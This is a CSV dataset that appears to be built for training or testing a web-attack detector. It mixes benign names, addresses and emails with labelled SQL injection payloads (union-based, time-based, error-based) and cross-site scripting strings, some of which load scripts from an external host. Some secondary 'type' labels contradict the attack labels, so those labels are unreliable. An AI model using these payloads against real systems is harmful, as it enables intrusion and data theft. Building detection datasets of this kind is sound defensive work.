Text,attack_type,Label,type
"1,exp(~(select * from (select concat(0x7171706a71,(select (elt(7759=7759,1))),0x717a767a71,0x78))x))",sqli,1,sql
arsene,norm,0,normal
ludolfo,norm,0,normal
"-2333' union all select 9714,9714,9714--",sqli,1,sql
"-1475"") union all select 8611,8611,8611#",sqli,1,sql
ponce vilda,norm,0,normal
02599003a,norm,0,normal
"-1949) as smyn where 4066=4066 union all select 4066,4066--",sqli,1,sql
carataunas,norm,0,normal
rebotadera,norm,0,normal
espina796,norm,0,normal
25324,norm,0,normal
"1"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""qqky"" like ""qqky",sqli,1,normal
pesillo,norm,0,normal
"calle virgen de la estrella, 196",norm,0,normal
"1"") as kdvb where 2651=2651 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
"1"" where 8387=8387;select (case when (2751=8206) then 2751 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
"1 or 8421=(select count(*) from generate_series(1,5000000))",sqli,1,sql
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3#",sqli,1,sql
1204533777404121,norm,0,normal
cerpa oitavn,norm,0,normal
"1))) and make_set(8403=8403,8899) and (((3036=3036",sqli,1,normal
02210042h,norm,0,normal
"1%'));select count(*) from generate_series(1,5000000) and (('%'='",sqli,1,sql
arjona,norm,0,normal
suplementero,norm,0,normal
29491,norm,0,normal
50709909s,norm,0,normal
5907,norm,0,normal
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""fqeu"" like ""fqeu",sqli,1,normal
"1"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
03789,norm,0,normal
ananas,norm,0,normal
1')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"1"" where 2221=2221 and 5318=8398--",sqli,1,sql
nez,norm,0,normal
-1499) as gxfm where 9762=9762 or 5989=4782--,sqli,1,sql
1 and 5934=7745,sqli,1,normal
"1%"")));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
mong-tse,norm,0,normal
leonila,norm,0,normal
envelar,norm,0,normal
monelli@carimartin.gd,norm,0,normal
brgmann saura,norm,0,normal
19135,norm,0,normal
"1'+(select nzij where 5456=5456 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",sqli,1,sql
1');waitfor delay '0:0:5' and ('yauq'='yauq,sqli,1,sql
5170755929650123,norm,0,normal
-3752,sqli,1,normal
42462633x,norm,0,normal
fortes@corjet.au,norm,0,normal
lzaro,norm,0,normal
86273903y,norm,0,normal
arnedo,norm,0,normal
e7c5c1da,norm,0,normal
"1'))) union all select null,null,null,null,null,null,null,null--",sqli,1,sql
1 or 6793=(select 6793 from pg_sleep(5))-- fyaq,sqli,1,sql
"-9007) as gill where 6462=6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",sqli,1,sql
"1'+(select 'dpun' where 4760=4760;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
99019422y,norm,0,normal
"1',(select (case when (8640=8640) then (ascii(regexp_substring(repeat(right(char(8640),0),500000000),null))) else 8640/(select 0 from information_schema.system_users) end) from information_schema.system_users)--",sqli,1,sql
1')) as xpmy where 5274=5274 rlike (select (case when (6252=7704) then 1 else 0x28 end))--,sqli,1,sql
"1""));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
"cardenal mendoza s/n, 7?h",norm,0,normal
chaoping,norm,0,normal
minnelli-gorse@canovash.gf,norm,0,normal
"1' where 8803=8803 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
1%' and (2439=2555)*2555 and '%'=',sqli,1,normal
beneixama,norm,0,normal
1608,norm,0,normal
"-1<xml src=""javascript:document.cookie=true;"">",xss,2,xss
v5482+ct0,norm,0,normal
"1 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
einar,norm,0,normal
1';if(4947=5350) select 4947 else drop function ereg--,sqli,1,sql
gilmartin,norm,0,normal
alpuche simani,norm,0,normal
02906029w,norm,0,normal
ret4ne3or,norm,0,normal
"calle japon, 124, 10a",norm,0,normal
"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""kzcd""=""kzcd",sqli,1,normal
albatana,norm,0,normal
troguet,norm,0,normal
51414020g,norm,0,normal
mazzotti9@novaservicios.bi,norm,0,normal
"-1<div style=""width: expression(document.cookie=true;);"">",xss,2,sql
adams@11horas.ng,norm,0,normal
"1"") as yphz where 8174=8174 union all select null,null,null,null,null,null,null--",sqli,1,sql
7740,norm,0,normal
"1')) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
1;begin dbms_lock.sleep(5); end# thjv,sqli,1,sql
1%' and 7533=7533 and '%'=',sqli,1,normal
"1"")) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""uzbl""=""uzbl",sqli,1,sql
50212,norm,0,normal
list-style:url() onerror=alert(1)></li>,xss,2,xss
1')) as qgyz where 1547=1547 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
ingrid,norm,0,normal
hendrika@kayaalicante.sc,norm,0,normal
0777026292170424,norm,0,normal
"1)) union all select null,null,null,null,null#",sqli,1,sql
acimentarse,norm,0,normal
"1%"")) or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
3203257419298834,norm,0,normal
fater,norm,0,normal
"camino viejo, 2,",norm,0,normal
5802409488938737,norm,0,normal
"calle los tipografos, 98, 4g",norm,0,normal
"1) as nxmd where 8650=8650;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
5815453075630332,norm,0,normal
"1')) as bedq where 8781=8781 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
"-8599)) or elt(5628=2324,2324) and ((1134=1134",sqli,1,normal
"1"")) as cduw where 4495=4495;select pg_sleep(5)--",sqli,1,sql
"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",xss,2,normal
"1%"" or (select * from (select(sleep(5)))ydpu) and ""%""=""",sqli,1,sql
01150051m,norm,0,normal
991,norm,0,normal
3618056132500846,norm,0,normal
ansaldo,norm,0,normal
angeles jarama,norm,0,normal
atiy,norm,0,normal
2331,norm,0,normal
nogueras,norm,0,normal
inocencia,norm,0,normal
7u6can*i2a04n,norm,0,normal
"1"" where 8483=8483 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%"");select sleep(5) and (""%""=""",sqli,1,sql
machacn,norm,0,normal
14480,norm,0,normal
caesar-vitez2@apelton.sy,norm,0,normal
enratonarse,norm,0,normal
svstica,norm,0,normal
26330,norm,0,normal
44432,norm,0,normal
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""pdqm"" like ""pdqm",sqli,1,sql
vacher,norm,0,normal
muntan pros,norm,0,normal
1103,norm,0,normal
barker ropero,norm,0,normal
1') as syer where 3141=3141 rlike (select (case when (6233=7567) then 1 else 0x28 end))--,sqli,1,sql
1' or 6793=(select 6793 from pg_sleep(5)) and 'hokd'='hokd,sqli,1,sql
yaiti,norm,0,normal
baziuk4,norm,0,normal
"1 or elt(6272=6272,sleep(5))-- ilfc",sqli,1,sql
modbar de la emparedada,norm,0,normal
av8ac65,norm,0,normal
"somozas, as",norm,0,normal
44750,norm,0,normal
"1"") union all select null,null,null,null,null,null,null,null--",sqli,1,sql
zimmerer,norm,0,normal
"-7916')) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",sqli,1,sql
olmeda de las fuentes,norm,0,normal
damia@elgrancolisionadordehadrones.es,norm,0,normal
7159,norm,0,normal
"1') as jwvp where 5231=5231 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
conchita,norm,0,normal
"1)));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"1%')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('%'='",sqli,1,sql
aro,norm,0,normal
"1"";waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",sqli,1,sql
"1%""))) and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
reiner,norm,0,normal
envaronar,norm,0,normal
-1<!-- -- --><script>document.cookie=true;</script><!-- -- -->,xss,2,xss
manzaneque@ssextremadura.mt,norm,0,normal
-6014')) or (9860=4848)*4848 and (('qtge'='qtge,sqli,1,normal
fpsched,norm,0,normal
"1' where 3362=3362;iif(5257=5257,1,1/0)",sqli,1,sql
"1' in boolean mode) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#",sqli,1,sql
5132486403637449,norm,0,normal
antoine,norm,0,normal
"-7514%""))) or 2448=8797#",sqli,1,normal
aboussou,norm,0,normal
-3462')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('cxku' like 'cxku,sqli,1,sql
5881598906156737,norm,0,normal
"-2625"")) as qfuo where 1980=1980 union all select 1980,1980,1980--",sqli,1,sql
"calle salvador de madariaga s/n,",norm,0,normal
cabolafuente,norm,0,normal
1'));waitfor delay '0:0:5'--,sqli,1,sql
"avda. pio xii, 48",norm,0,normal
.lapidosa,norm,0,normal
-5258) or (8459=8459)*4906,sqli,1,normal
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('labj'='labj",sqli,1,sql
pasote,norm,0,normal
"<style type=""text/javascript"">alert('crosssitescripting');</style>",xss,2,sql
"-2912"") as eizh where 2223=2223 or make_set(1041=3056,3056)--",sqli,1,sql
sa?balero,norm,0,normal
"1%"";(select * from (select(sleep(5)))srmq) and ""%""=""",sqli,1,sql
escobado,norm,0,normal
9492211804246641,norm,0,normal
paladio,norm,0,normal
"1"" where 9135=9135 and elt(4249=4249,7259)--",sqli,1,sql
9228046254742614,norm,0,normal
1) where 1929=1929 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
9785799371195740,norm,0,normal
-8233' or 9538=1882#,sqli,1,normal
mio odena,norm,0,normal
koleskidy@manjarr.ps,norm,0,normal
"1%"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""%""=""",sqli,1,sql
62120654t,norm,0,normal
kaylil,norm,0,normal
1%' or (select * from (select(sleep(5)))ydpu) and '%'=',sqli,1,sql
"1'+(select 'vbqo' where 5630=5630 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,sql
"1"") as wsyv where 8142=8142 rlike sleep(5)#",sqli,1,normal
"1""))) order by 1#",sqli,1,normal
"maestro de burgos, 199",norm,0,normal
sala@mystyleperfume.ls,norm,0,normal
"1%"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
lavada,norm,0,normal
8318,norm,0,normal
kavaler,norm,0,normal
chaurett,norm,0,normal
90230020p,norm,0,normal
"-6770"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",sqli,1,sql
84411118z,norm,0,normal
ailee1,norm,0,normal
mattes,norm,0,normal
39313,norm,0,normal
"-3462)) as biyl where 5143=5143 union all select 5143,5143,5143--",sqli,1,sql
-6405%'))) or (8459=8459)*4906 and ((('%'=',sqli,1,normal
1'));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
01139,norm,0,normal
agobiar,norm,0,normal
papero,norm,0,normal
1')));select (case when (1291=6612) then 1 else 1291*(select 1291 from master..sysdatabases) end)--,sqli,1,sql
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""hrkf"" like ""hrkf",sqli,1,sql
63a5et5192,norm,0,normal
riedel villaplana,norm,0,normal
1927389930428156,norm,0,normal
lucio,norm,0,normal
"make_set(2672=2672,5440)",sqli,1,normal
"-9734')) as izbx where 6273=6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",sqli,1,sql
"c/ fernandez shaw, 177 1-e",norm,0,normal
"1',(select (case when (1392=1380) then 1 else 1392*(select 1392 from master..sysdatabases) end))",sqli,1,sql
no3otr46,norm,0,normal
r393lin3nte,norm,0,normal
3679,norm,0,normal
"1"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""rkvr""=""rkvr",sqli,1,sql
pleskot@multasdetransito.mu,norm,0,normal
-1854') as fmmq where 7326=7326 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
amush,norm,0,normal
carras@quiromante.vi,norm,0,normal
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""jywy"" like ""jywy",sqli,1,sql
"1"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""jyad""=""jyad",sqli,1,sql
jamshidi,norm,0,normal
<script id=xss src=http://ha.ckers.org/xss.js></script>,xss,2,xss
"1"" where 5333=5333 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
zendo,norm,0,normal
"1%')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
">""<script>document.cookie=true;//<</script>",xss,2,xss
"1%'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='",sqli,1,sql
kari,norm,0,normal
samuel.felden@multaspendientes.yu,norm,0,normal
1'||(select 'idna' from dual where 2683=2683 rlike (select (case when (3201=9748) then 1 else 0x28 end)))||',sqli,1,sql
aquiles,norm,0,normal
"1')) as crzr where 5373=5373 and elt(3114=3114,sleep(5))#",sqli,1,normal
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'ucpa'='ucpa,sqli,1,sql
monique,norm,0,normal
espinosa@chicashumedas.net,norm,0,normal
calle puerto de alcolea 185 9-e,norm,0,normal
"1"") as rnte where 6517=6517 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
navalperal de tormes,norm,0,normal
regi0ona2,norm,0,normal
44366,norm,0,normal
"calle nueva de arriba, 111 9g",norm,0,normal
patorzinski@filtraciondehumos.hr,norm,0,normal
"1"") where 4660=4660 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
sigut,norm,0,normal
geldres pittaluga,norm,0,normal
67872602q,norm,0,normal
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",sqli,1,sql
1)) as eveb where 7567=7567;if(5316=4416) select 5316 else drop function vtve--,sqli,1,sql
"1'||(select 'eayf' where 5431=5431 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))||'",sqli,1,sql
duffy,norm,0,normal
waller,norm,0,normal
puebla de la sierra,norm,0,normal
57476315m,norm,0,normal
c28a3iz8,norm,0,normal
robillar,norm,0,normal
"1'+(select kgon where 9014=9014 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))+'",sqli,1,sql
"1"")) as aozi where 3354=3354 waitfor delay '0:0:5'--",sqli,1,sql
"-8013%"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",sqli,1,sql
bringu mulleras,norm,0,normal
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('ofko'='ofko",sqli,1,sql
pierre,norm,0,normal
-6412%' or 4065=5815 and '%'=',sqli,1,normal
"1%'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('%'='",sqli,1,sql
04137943j,norm,0,normal
"calle poador, 65 3a",norm,0,normal
langa del castillo,norm,0,normal
6138,norm,0,normal
post3rior1e.nte,norm,0,normal
"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",sqli,1,sql
hus24lero,norm,0,normal
espana@flabingo.dk,norm,0,normal
vasilescu.lisi@drogasvirtuales.sc,norm,0,normal
"-1204')) union all select 3585,3585--",sqli,1,sql
ambrose,norm,0,normal
"-6116"")) union all select 3679,3679,3679,3679,3679,3679,3679--",sqli,1,sql
toperzer1,norm,0,normal
"sol, 153",norm,0,normal
vallado oliveras,norm,0,normal
"calle manuel de falla, 65 5?a",norm,0,normal
19342,norm,0,normal
4562,norm,0,normal
laureano,norm,0,normal
"1%'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('%'='",sqli,1,normal
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
02933716c,norm,0,normal
04803273e,norm,0,normal
1) as nwfz where 7365=7365 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
"<layer id=xss src=""http://ha.ckers.org/scriptlet.html""></layer>",xss,2,normal
1') as fyib where 9246=9246;select (case when (5085=4259) then 5085 else 5085*(select 5085 from mysql.db) end)#,sqli,1,sql
81403734h,norm,0,normal
05593,norm,0,normal
-8359) where 4430=4430 or 6872=6872--,sqli,1,sql
belak-geraci@buscamoto.mm,norm,0,normal
